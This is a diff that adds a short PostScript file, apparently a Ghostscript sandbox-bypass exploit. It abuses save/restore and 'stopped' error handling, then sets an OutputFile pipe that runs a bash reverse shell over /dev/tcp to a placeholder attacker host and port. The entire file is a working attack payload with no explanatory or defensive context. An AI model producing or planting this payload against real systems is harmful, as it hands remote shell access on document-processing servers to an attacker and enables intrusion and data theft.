@@ -1,0 +1,8 @@
+%!PS
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/yourip/yourport 0>&1') currentdevice putdeviceprops
